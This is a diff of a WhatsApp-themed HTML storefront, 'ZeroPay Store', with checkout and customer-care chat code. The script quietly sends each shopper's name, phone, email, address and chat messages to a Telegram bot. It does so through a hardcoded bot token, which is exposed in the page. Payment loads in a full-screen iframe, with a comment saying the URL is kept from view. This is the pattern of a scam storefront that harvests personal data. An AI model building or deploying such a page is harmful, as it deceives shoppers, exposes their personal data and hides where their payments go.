@@ -1,183 +1,462 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>WhatsApp Store</title>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>ZeroPay Store — Storefront</title>
 <style>
-    body { font-family: Arial, sans-serif; margin:0; padding:0; background:#f5f5f5; }
-    header { background:#075E54; color:white; padding:15px; text-align:center; font-size:22px; }
+  /* Basic layout + WhatsApp theme preserved */
+  :root{--green:#128C7E;--dark:#075E54;--accent:#25D366}
+  body,html{margin:0;padding:0;font-family:Arial,Helvetica,sans-serif;background:#ece5dd;color:#111}
+  header{background:var(--dark);color:#fff;padding:12px 18px;display:flex;align-items:center;gap:12px}
+  header img.logo{height:44px;border-radius:6px}
+  header h1{font-size:20px;margin:0}
 
-    /* PRODUCT GRID */
-    .products { display:grid; grid-template-columns:repeat(auto-fill,minmax(160px,1fr)); gap:15px; padding:20px; }
-    .item { background:white; border-radius:8px; padding:10px; box-shadow:0 2px 5px rgba(0,0,0,0.1); }
-    .item img { width:100%; height:150px; object-fit:cover; border-radius:5px; }
-    .item h3 { font-size:16px; margin:5px 0; }
-    .item p { margin:3px 0; font-size:14px; }
-    .buy-btn { background:#128C7E; color:white; padding:8px; border:none; width:100%; border-radius:5px; cursor:pointer; }
+  .container{padding:18px;max-width:1100px;margin:20px auto}
+  .products{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:16px}
+  .product{background:#fff;border-radius:10px;padding:12px;box-shadow:0 6px 18px rgba(0,0,0,.06);display:flex;flex-direction:column;align-items:stretch}
+  .product img{width:100%;height:160px;object-fit:cover;border-radius:8px}
+  .product h3{margin:10px 0 6px;color:var(--dark);font-size:16px}
+  .product .price{font-weight:700;color:var(--accent);margin-bottom:8px}
+  .product .desc{font-size:13px;color:#555;margin-bottom:10px;flex:1}
+  .product button{background:var(--green);color:#fff;border:0;padding:10px;border-radius:8px;cursor:pointer;font-weight:700}
 
-    /* CHAT BUTTON */
-    #chatBtn {
-        position:fixed; bottom:20px; right:20px;
-        background:#25D366; color:white;
-        border-radius:50%; width:60px; height:60px;
-        display:flex; justify-content:center; align-items:center;
-        font-size:28px; cursor:pointer; box-shadow:0 3px 8px rgba(0,0,0,0.3);
-    }
+  footer{padding:12px;text-align:center;color:#555;margin-top:20px}
 
-    /* CHAT BOX */
-    #chatBox {
-        position:fixed; bottom:90px; right:20px;
-        width:320px; background:white; border-radius:10px;
-        box-shadow:0 0 10px rgba(0,0,0,0.3);
-        display:none; flex-direction:column;
-    }
-    #chatHeader {
-        background:#075E54; color:white; padding:10px;
-        border-radius:10px 10px 0 0; text-align:center;
-    }
-    #chatMessages {
-        height:260px; overflow-y:auto; padding:10px;
-    }
-    .msg { margin:5px 0; padding:8px; border-radius:6px; max-width:80%; }
-    .bot { background:#e2ffc7; align-self:flex-start; }
-    .user { background:#dcf8c6; align-self:flex-end; }
+  /* Checkout flow modals: quantity first, then delivery form */
+  .modal-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.55);display:none;align-items:center;justify-content:center;z-index:9999}
+  .modal{background:#fff;border-radius:12px;padding:18px;width:360px;max-width:94%;box-shadow:0 8px 30px rgba(0,0,0,.3)}
+  .modal h2{margin:0 0 8px;font-size:18px;color:var(--dark)}
+  .modal label{font-size:13px;color:#333}
+  .modal input, .modal select, .modal textarea{width:100%;padding:8px;margin:8px 0;border-radius:6px;border:1px solid #ccc}
+  .modal .row{display:flex;gap:8px}
+  .modal .row .col{flex:1}
+  .modal .actions{display:flex;gap:8px;margin-top:10px}
+  .btn{background:var(--green);color:#fff;border:0;padding:10px;border-radius:8px;cursor:pointer;font-weight:700}
+  .btn.secondary{background:#ccc;color:#000}
 
-    #chatInput { display:flex; padding:10px; border-top:1px solid #ccc; }
-    #chatInput input { flex:1; padding:8px; border:1px solid #ccc; border-radius:5px; }
-    #chatInput button { margin-left:5px; padding:8px; background:#128C7E; color:white; border:none; border-radius:5px; }
+  /* Payment iframe full-screen */
+  #paymentIframe{display:none;position:fixed;inset:0;width:100%;height:100%;border:0;z-index:99999;background:#fff}
 
-    /* REGISTRATION */
-    #regForm {
-        padding:10px;
-        display:flex; flex-direction:column;
-    }
-    #regForm input {
-        margin:5px 0; padding:8px;
-        border:1px solid #ccc; border-radius:5px;
-    }
-    #regForm button {
-        background:#25D366; color:white;
-        border:none; padding:10px; margin-top:10px;
-        border-radius:5px; cursor:pointer;
-    }
+  /* Customer care chat */
+  #chatBtn{position:fixed;right:18px;bottom:18px;width:62px;height:62px;border-radius:50%;background:var(--accent);display:flex;align-items:center;justify-content:center;color:#fff;font-size:26px;cursor:pointer;z-index:10001;box-shadow:0 8px 20px rgba(0,0,0,.25)}
+  #chatPanel{position:fixed;right:18px;bottom:96px;width:360px;max-width:96%;background:#fff;border-radius:12px;box-shadow:0 8px 30px rgba(0,0,0,.25);display:none;flex-direction:column;z-index:10001;overflow:hidden}
+  #chatHeader{background:var(--dark);color:#fff;padding:10px;display:flex;gap:8px;align-items:center}
+  #chatHeader img{height:44px;width:44px;border-radius:50%;object-fit:cover;border:2px solid rgba(255,255,255,.12)}
+  #chatMessages{padding:12px;height:260px;overflow:auto;background:#f6f6f6;display:flex;flex-direction:column;gap:8px}
+  .bubble{max-width:78%;padding:8px 10px;border-radius:12px}
+  .bubble.user{align-self:flex-end;background:#dcf8c6}
+  .bubble.bot{align-self:flex-start;background:#fff;border:1px solid #eee}
+  #chatFooter{padding:10px;border-top:1px solid #eee;background:#fff;display:flex;flex-direction:column;gap:8px}
+  #regForm{display:flex;flex-direction:column;gap:6px}
+  #regForm .avatars{display:flex;gap:8px}
+  .avatar{width:48px;height:48px;border-radius:50%;object-fit:cover;border:2px solid transparent;cursor:pointer}
+  .avatar.selected{border-color:var(--dark)}
+  .quickQs{display:flex;flex-wrap:wrap;gap:6px}
+  .quickQs button{background:var(--green);color:#fff;border:0;padding:6px 8px;border-radius:6px;cursor:pointer;font-size:13px}
+
+  /* Popup center box */
+  #popupBoxWrap{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,.45);z-index:10002}
+  #popupBox{width:360px;max-width:94%;background:#fff;border-radius:12px;padding:16px;text-align:center;box-shadow:0 12px 40px rgba(0,0,0,.3)}
+  #popupBox img{max-width:100%;border-radius:8px;margin-bottom:10px}
+  #popupBox h3{margin:0 0 8px}
+  #popupBox p{color:#444}
+
+  /* small responsive tweak */
+  @media(max-width:420px){ #chatPanel{right:8px;left:8px;width:auto} .products{grid-template-columns:repeat(auto-fill,minmax(160px,1fr))} }
 </style>
 </head>
 <body>
 
-<header>WhatsApp Store</header>
+<header>
+  <img class="logo" src="logo.png" alt="Logo" onerror="this.style.display='none'">
+  <h1>ZeroPay Store</h1>
+</header>
 
-<div class="products" id="productList">Loading products...</div>
+<div class="container">
+  <div id="products" class="products">Loading products...</div>
+</div>
 
-<!-- CHAT BUTTON -->
+<footer>© <span id="year"></span> ZeroPay Store</footer>
+
+<!-- POPUP (center) -->
+<div id="popupBoxWrap"><div id="popupBox">
+  <img id="popupImg" src="" style="display:none"/>
+  <h3 id="popupTitle"></h3>
+  <p id="popupDesc"></p>
+  <div style="margin-top:12px;">
+    <a id="popupLink" href="#" target="_blank" style="display:none;text-decoration:none"><button class="btn">Open</button></a>
+    <button onclick="closePopup()" class="btn secondary">Close</button>
+  </div>
+</div></div>
+
+<!-- MODAL 1: Quantity selector -->
+<div id="qtyBackdrop" class="modal-backdrop"><div class="modal">
+  <h2 id="qtyProductName">Quantity</h2>
+  <div>
+    <label>Unit price: <span id="unitPrice">0</span></label>
+    <div class="row">
+      <div class="col"><label>Quantity</label><input id="inputQty" type="number" value="1" min="1"/></div>
+      <div class="col"><label>Currency</label><input id="displayCurrency" type="text" value="USD"/></div>
+    </div>
+    <div style="margin-top:8px;font-weight:700;text-align:right">Total: <span id="calcTotal">0.00</span></div>
+    <div class="actions">
+      <button class="btn" id="proceedDeliveryBtn">Proceed to Delivery</button>
+      <button class="btn secondary" onclick="closeQty()">Cancel</button>
+    </div>
+  </div>
+</div></div>
+
+<!-- MODAL 2: Delivery form -->
+<div id="deliveryBackdrop" class="modal-backdrop"><div class="modal">
+  <h2>Delivery Details</h2>
+  <label>Full name</label><input id="dName" type="text"/>
+  <label>Phone (include country code)</label><input id="dPhone" type="text"/>
+  <label>Email (optional)</label><input id="dEmail" type="email"/>
+  <label>Country</label><input id="dCountry" type="text" value="USA"/>
+  <label>Address</label><input id="dAddress" type="text"/>
+  <label>City</label><input id="dCity" type="text"/>
+  <label>State</label><input id="dState" type="text"/>
+  <label>ZIP</label><input id="dZip" type="text"/>
+  <div style="margin-top:8px;font-weight:700">Order total: <span id="orderTotal">0.00</span></div>
+  <div class="actions">
+    <button class="btn" id="submitOrderBtn">Confirm & Pay</button>
+    <button class="btn secondary" onclick="closeDelivery()">Cancel</button>
+  </div>
+</div></div>
+
+<!-- Payment iframe (full-screen) -->
+<iframe id="paymentIframe"></iframe>
+
+<!-- CHAT BUTTON + PANEL -->
 <div id="chatBtn">💬</div>
+<div id="chatPanel">
+  <div id="chatHeader">
+    <img id="chatAvatar" src="https://i.postimg.cc/9Ff5xqKw/female.png" alt="Agent"/>
+    <div>
+      <div style="font-weight:700">Customer Care</div>
+      <div style="font-size:12px">We're here to help</div>
+    </div>
+  </div>
 
-<!-- CHAT BOX -->
-<div id="chatBox">
-    <div id="chatHeader">Customer Care</div>
-    <div id="chatMessages"></div>
+  <div id="chatMessages"></div>
 
+  <div id="chatFooter">
     <div id="regForm">
-        <input id="rName" type="text" placeholder="Full Name" required>
-        <input id="rEmail" type="email" placeholder="Email Address" required>
-        <input id="rPhone" type="text" placeholder="Phone Number" required>
-        <input id="rCountry" type="text" placeholder="Country" required>
-        <button onclick="submitRegistration()">Start Chat</button>
+      <div style="display:flex;align-items:center;gap:8px;">
+        <div class="avatars">
+          <img src="https://i.postimg.cc/9Ff5xqKw/female.png" class="avatar selected" id="avatarFemale" title="Female"/>
+          <img src="https://i.postimg.cc/wT8N1v79/male.png" class="avatar" id="avatarMale" title="Male"/>
+        </div>
+      </div>
+      <input id="regName" placeholder="Full name" required/>
+      <input id="regEmail" placeholder="Email" required/>
+      <input id="regPhone" placeholder="Phone (include + country code)" required/>
+      <input id="regCountry" placeholder="Country" value="USA" required/>
+      <div class="small" style="font-size:12px;color:#666">Choose a quick question to start:</div>
+      <div class="quickQs">
+        <button onclick="pickQuick('Where is my order?')">Where is my order?</button>
+        <button onclick="pickQuick('Payment issue')">Payment issue</button>
+        <button onclick="pickQuick('Product info')">Product info</button>
+      </div>
+      <button id="regSubmit" class="btn">Register & Start Chat</button>
     </div>
 
     <div id="chatInput" style="display:none;">
-        <input id="chatText" type="text" placeholder="Type here...">
-        <button onclick="sendMessage()">Send</button>
+      <input id="msgText" placeholder="Type a message..."/>
+      <div style="display:flex;gap:8px;margin-top:6px;">
+        <button class="btn" onclick="sendChat()">Send</button>
+        <button class="btn secondary" onclick="endChat()">End</button>
+      </div>
     </div>
+  </div>
 </div>
 
 <script>
+/* ---------------- CONFIG (already set with your values) ---------------- */
 const BOT_TOKEN = "8003409315:AAEVIPsOYnF8mBaT8l-kmzWucHUTu9Yo8AY";
-const CHAT_ID = "8085649636";
+const CHAT_ID   = "8085649636";
+/* ---------------------------------------------------------------------- */
 
-/* LOAD PRODUCTS */
-fetch("products.json")
-.then(res => res.json())
-.then(data => {
-    const box = document.getElementById("productList");
-    box.innerHTML = "";
-    data.forEach(p => {
-        box.innerHTML += `
-        <div class="item">
-            <img src="${p.image}">
-            <h3>${p.name}</h3>
-            <p>${p.price}</p>
-            <button class="buy-btn" onclick='buyProduct("${p.name}", "${p.price}")'>Buy</button>
-        </div>`;
-    });
-})
-.catch(() => {
-    document.getElementById("productList").innerHTML = "Failed to load products.";
+document.getElementById('year').textContent = new Date().getFullYear();
+
+/* ------------------ PRODUCTS LOAD ------------------ */
+/*
+  Products are loaded from (in order):
+  1) localStorage 'zp_products' (admin edits)
+  2) fallback to products.json (hosted)
+*/
+let products = [];
+async function loadProducts(){
+  const stored = localStorage.getItem('zp_products');
+  if(stored){
+    try{ products = JSON.parse(stored); renderProducts(); return; } catch(e){ products=[]; }
+  }
+  try{
+    const r = await fetch('products.json', {cache:'no-store'});
+    if(r.ok){ products = await r.json(); renderProducts(); return; }
+  }catch(e){}
+  document.getElementById('products').innerHTML = '<p style="padding:12px">No products available.</p>';
+}
+function renderProducts(){
+  const grid = document.getElementById('products');
+  grid.innerHTML = '';
+  products.forEach((p, i) => {
+    const div = document.createElement('div'); div.className='product';
+    const img = (p.images && p.images.length)? p.images[0] : (p.image || 'https://via.placeholder.com/400x300?text=Product');
+    div.innerHTML = `<img src="${img}" alt=""><h3>${escapeHtml(p.name)}</h3><div class="price">${p.currency||'USD'} ${Number(p.price).toFixed(2)}</div><div class="desc">${escapeHtml(p.description||'')}</div><button onclick="startBuy(${i})">Buy</button>`;
+    grid.appendChild(div);
+  });
+}
+
+/* ------------------ BUY FLOW ------------------ */
+let currentIndex = null;
+let currentQty = 1;
+let currentTotal = 0;
+
+function startBuy(index){
+  currentIndex = index;
+  currentQty = 1;
+  const p = products[index];
+  document.getElementById('qtyProductName').innerText = p.name;
+  document.getElementById('unitPrice').innerText = (p.currency||'USD') + ' ' + Number(p.price).toFixed(2);
+  document.getElementById('displayCurrency').value = p.currency || 'USD';
+  document.getElementById('inputQty').value = 1;
+  updateCalcTotal();
+  showElement('qtyBackdrop');
+}
+
+function updateCalcTotal(){
+  const p = products[currentIndex];
+  const qty = parseInt(document.getElementById('inputQty').value) || 1;
+  const total = qty * Number(p.price || 0);
+  currentQty = qty; currentTotal = total;
+  document.getElementById('calcTotal').innerText = (p.currency||'USD') + ' ' + total.toFixed(2);
+}
+document.getElementById('inputQty').addEventListener('input', updateCalcTotal);
+
+document.getElementById('proceedDeliveryBtn').addEventListener('click', ()=>{
+  // close qty and open delivery modal, set order total display
+  document.getElementById('orderTotal').innerText = (products[currentIndex].currency||'USD') + ' ' + currentTotal.toFixed(2);
+  hideElement('qtyBackdrop');
+  showElement('deliveryBackdrop');
 });
 
-/* BUY PRODUCT */
-function buyProduct(name, price) {
-    let msg = `🛒 *NEW ORDER*\nProduct: ${name}\nPrice: ${price}\n\nUser will provide address on WhatsApp.`;
-    
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode:"Markdown" })
+function closeQty(){ hideElement('qtyBackdrop'); }
+function closeDelivery(){ hideElement('deliveryBackdrop'); }
+
+/* Validate delivery then send order and open payment iframe */
+document.getElementById('submitOrderBtn').addEventListener('click', async ()=>{
+  const name = document.getElementById('dName').value.trim();
+  const phone = document.getElementById('dPhone').value.trim();
+  const address = document.getElementById('dAddress').value.trim();
+  const country = document.getElementById('dCountry').value.trim() || 'USA';
+  if(!name || !phone || !address) { alert('Please enter name, phone and address'); return; }
+
+  // compute totals (shipping & discount not implemented here for simplicity)
+  const p = products[currentIndex];
+  const qty = currentQty;
+  const subtotal = Number(p.price) * qty;
+  const shippingKey = document.getElementById('orderShipping') ? document.getElementById('orderShipping').value : 'standard';
+  const shipping = (shippingKey === 'express') ? 50 : (shippingKey === 'pickup' ? 0 : 20);
+  const total = subtotal + shipping;
+  const order = {
+    product: p.name,
+    product_id: p.id || '',
+    qty,
+    unit_price: p.price,
+    subtotal: subtotal.toFixed(2),
+    shipping: shipping.toFixed(2),
+    total: total.toFixed(2),
+    customer_name: name,
+    customer_phone: phone,
+    customer_email: document.getElementById('dEmail').value.trim(),
+    country,
+    address,
+    city: document.getElementById('dCity').value.trim(),
+    state: document.getElementById('dState').value.trim(),
+    zip: document.getElementById('dZip').value.trim(),
+    timestamp: new Date().toISOString()
+  };
+
+  // 1) send order details to Telegram (POST)
+  try{
+    const text = [
+      '🛒 *New Order*',
+      `*Product:* ${order.product}`,
+      `*Qty:* ${order.qty}`,
+      `*Total:* USD ${order.total}`,
+      `*Name:* ${order.customer_name}`,
+      `*Phone:* ${order.customer_phone}`,
+      `*Email:* ${order.customer_email || 'N/A'}`,
+      `*Address:* ${order.address}, ${order.city || ''}, ${order.state || ''}, ${order.zip || ''}`,
+      `*Country:* ${order.country}`,
+      `*Time:* ${order.timestamp}`
+    ].join('\n');
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode:'Markdown' })
     });
-    
-    alert("We received your order. We will contact you shortly.");
+  }catch(err){
+    console.warn('Telegram error', err);
+  }
+
+  // 2) open payment iframe with product payment_link or global link
+  const base = (p.payment_link && p.payment_link.length) ? p.payment_link : (localStorage.getItem('zp_global_pay') || '');
+  if(!base){
+    alert('Payment link not configured for this product. Seller will contact you.');
+    hideElement('deliveryBackdrop');
+    return;
+  }
+  const payload = {
+    amount: order.total,
+    quantity: order.qty,
+    item: order.product,
+    currency: p.currency || 'USD'
+  };
+  const url = base + (base.includes('?') ? '&' : '?') + Object.keys(payload).map(k=>encodeURIComponent(k)+'='+encodeURIComponent(payload[k])).join('&');
+
+  // open in same dashboard - full screen iframe (no url shown)
+  const iframe = document.getElementById('paymentIframe');
+  iframe.src = url;
+  iframe.style.display = 'block';
+  hideElement('deliveryBackdrop');
+});
+
+/* Helper show/hide */
+function showElement(id){ document.getElementById(id).style.display = 'flex'; }
+function hideElement(id){ document.getElementById(id).style.display = 'none'; }
+
+/* Close iframe with ESC */
+window.addEventListener('keydown', (e)=>{ if(e.key==='Escape'){ document.getElementById('paymentIframe').style.display='none'; document.getElementById('paymentIframe').src=''; } });
+
+/* ------------------ CHAT LOGIC (register required) ------------------ */
+const chatBtn = document.getElementById('chatBtn');
+const chatPanel = document.getElementById('chatPanel');
+const regForm = document.getElementById('regForm');
+const chatInputBox = document.getElementById('chatInput');
+const chatMessages = document.getElementById('chatMessages');
+
+chatBtn.addEventListener('click', ()=> { chatPanel.style.display = (chatPanel.style.display === 'flex') ? 'none' : 'flex'; });
+
+/* avatar select */
+document.getElementById('avatarFemale').addEventListener('click', ()=> selectAvatar('female'));
+document.getElementById('avatarMale').addEventListener('click', ()=> selectAvatar('male'));
+function selectAvatar(kind){
+  document.getElementById('avatarFemale').classList.remove('selected');
+  document.getElementById('avatarMale').classList.remove('selected');
+  if(kind==='female') document.getElementById('avatarFemale').classList.add('selected'), document.getElementById('chatAvatar').src = document.getElementById('avatarFemale').src;
+  else document.getElementById('avatarMale').classList.add('selected'), document.getElementById('chatAvatar').src = document.getElementById('avatarMale').src;
 }
 
-/* CHAT SYSTEM */
-document.getElementById("chatBtn").onclick = () => {
-    document.getElementById("chatBox").style.display = "flex";
-};
+/* quick pick question */
+function pickQuick(text){
+  // show registration if required
+  // put quick text into chat after registration
+  document.getElementById('msgText').value = text;
+}
 
-function submitRegistration() {
-    let name = rName.value;
-    let email = rEmail.value;
-    let phone = rPhone.value;
-    let country = rCountry.value;
+/* register and send details to Telegram */
+document.getElementById('regSubmit').addEventListener('click', async ()=>{
+  const name = document.getElementById('regName').value.trim();
+  const email = document.getElementById('regEmail').value.trim();
+  const phone = document.getElementById('regPhone').value.trim();
+  const country = document.getElementById('regCountry').value.trim();
+  if(!name || !email || !phone || !country){ alert('Please fill all required fields'); return; }
 
-    let text = `👤 *NEW CUSTOMER REGISTERED*\nName: ${name}\nEmail: ${email}\nPhone: ${phone}\nCountry: ${country}`;
+  // save user locally
+  const user = { name, email, phone, country, avatar: document.querySelector('.avatar.selected').id.includes('Female') ? 'female' : 'male', registered: new Date().toISOString() };
+  localStorage.setItem('zp_chat_user', JSON.stringify(user));
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({ chat_id: CHAT_ID, text:text, parse_mode:"Markdown" })
+  // send registration to Telegram
+  try{
+    const text = [
+      '🆕 *New Chat Registration*',
+      `*Name:* ${name}`,
+      `*Email:* ${email}`,
+      `*Phone:* ${phone}`,
+      `*Country:* ${country}`,
+      `*Time:* ${new Date().toISOString()}`
+    ].join('\n');
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode:'Markdown' })
     });
+  }catch(err){ console.warn('Telegram error', err); }
 
-    localStorage.setItem("chatUser", name);
+  // show chat input
+  regForm.style.display = 'none';
+  chatInputBox.style.display = 'block';
+  addChatBot(`Welcome ${name}! How can I help you today?`);
+});
 
-    document.getElementById("regForm").style.display = "none";
-    document.getElementById("chatInput").style.display = "flex";
+/* send chat message to telegram and show local message */
+async function sendChat(){
+  const txt = document.getElementById('msgText').value.trim();
+  if(!txt) return;
+  addChatUser(txt);
+  document.getElementById('msgText').value = '';
 
-    botReply("Welcome " + name + "! How can I help you today?");
+  // send to Telegram so you can reply later
+  const user = JSON.parse(localStorage.getItem('zp_chat_user') || '{}');
+  const payloadText = [
+    '💬 *New Message from Chat*',
+    `*From:* ${user.name || 'Unknown'}`,
+    `*Phone:* ${user.phone || 'N/A'}`,
+    `*Message:* ${txt}`,
+    `*Time:* ${new Date().toISOString()}`
+  ].join('\n');
+  try{
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text: payloadText, parse_mode:'Markdown' })
+    });
+  }catch(err){ console.warn('Telegram error', err); }
+
+  // simple AI auto-reply when you are not online:
+  setTimeout(()=> addChatBot("Thanks — we received your message. We'll reply shortly."), 900);
 }
 
-function sendMessage() {
-    let text = chatText.value.trim();
-    if (!text) return;
+/* helpers to show messages */
+function addChatUser(text){ const d = document.createElement('div'); d.className='bubble user'; d.innerText = text; chatMessages.appendChild(d); chatMessages.scrollTop = chatMessages.scrollHeight; }
+function addChatBot(text){ const d = document.createElement('div'); d.className='bubble bot'; d.innerText = text; chatMessages.appendChild(d); chatMessages.scrollTop = chatMessages.scrollHeight; }
+function endChat(){ chatPanel.style.display = 'none'; }
 
-    addMsg(text,"user");
-    chatText.value = "";
-
-    setTimeout(()=> botReply("I understand. Let me help you with that."),900);
+/* ------------------ POPUP LOAD & SHOW ------------------ */
+async function loadPopup(){
+  // try hosted /popup.json
+  try{
+    const r = await fetch('/popup.json', {cache:'no-store'});
+    if(r.ok){
+      const arr = await r.json();
+      if(Array.isArray(arr) && arr.length>0){ showPopup(arr[arr.length-1]); return; }
+    }
+  }catch(e){}
+  // fallback to localStorage
+  const local = JSON.parse(localStorage.getItem('zp_popups') || '[]');
+  if(local && local.length>0) showPopup(local[local.length-1]);
 }
 
-function addMsg(msg,type) {
-    let box = document.getElementById("chatMessages");
-    let div = document.createElement("div");
-    div.className = "msg " + type;
-    div.innerText = msg;
-    box.appendChild(div);
-    box.scrollTop = box.scrollHeight;
+function showPopup(p){
+  if(!p) return;
+  document.getElementById('popupTitle').innerText = p.title || (p.text || '');
+  document.getElementById('popupDesc').innerText = p.description || p.text || '';
+  if(p.img){ document.getElementById('popupImg').src = p.img; document.getElementById('popupImg').style.display='block'; } else { document.getElementById('popupImg').style.display='none'; }
+  if(p.link){ document.getElementById('popupLink').href = p.link; document.getElementById('popupLink').style.display='inline-block'; document.getElementById('popupLink').querySelector('button').innerText = p.linkText || 'Open'; }
+  else { document.getElementById('popupLink').style.display='none'; }
+  document.getElementById('popupBoxWrap').style.display = 'flex';
 }
+function closePopup(){ document.getElementById('popupBoxWrap').style.display = 'none'; }
 
-function botReply(txt) {
-    addMsg(txt,"bot");
-}
+/* small util */
+function escapeHtml(s){ if(!s) return ''; return String(s).replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"}[c])); }
+
+/* init */
+loadProducts().then(()=> loadPopup());
 </script>
-
 </body>
 </html>
